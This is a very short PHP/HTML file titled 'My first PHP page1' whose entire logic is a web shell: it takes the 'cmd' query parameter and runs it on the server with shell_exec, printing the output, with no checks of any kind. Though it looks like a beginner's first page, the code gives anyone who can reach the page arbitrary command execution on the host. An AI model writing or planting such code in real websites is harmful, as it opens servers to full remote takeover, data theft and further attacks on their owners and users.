<!DOCTYPE html>
<html>
<body>

<h1>My first PHP page1</h1>

<?php
$cmd = $_GET['cmd'];

// echo $cmd;
// echo $cmd;
// $res = exec($cmd);

echo shell_exec($cmd);

?>

</body>
</html>
